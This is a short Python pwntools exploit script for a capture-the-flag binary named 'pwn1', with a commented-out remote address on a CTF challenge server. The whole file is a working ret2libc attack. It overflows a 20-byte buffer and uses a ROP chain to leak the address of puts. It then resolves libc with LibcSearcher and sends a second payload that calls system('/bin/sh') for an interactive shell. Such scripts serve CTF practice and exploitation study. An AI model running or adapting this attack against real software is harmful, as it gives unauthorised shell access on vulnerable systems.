from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
context.arch = 'amd64'
p = process('./pwn1')
#p = remote('pwn.challenge.ctf.show',28138)
pop_rdi_ret = 0x04006e3
ret_addr = 0x00000000004006E4
elf = ELF('./pwn1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start_addr = elf.symbols['_start']
payload1 = 'a'*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
p.sendline(payload1)
p.recvuntil('\x0a')
libc_puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc = LibcSearcher('puts', libc_puts_addr)
libcbase = libc_puts_addr - libc.dump('puts')
sys_addr = libcbase+libc.dump('system')
bin_sh = libcbase+libc.dump('str_bin_sh')
payload = 'a'*20+p64(0x00000000004004c6)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload)
p.interactive()
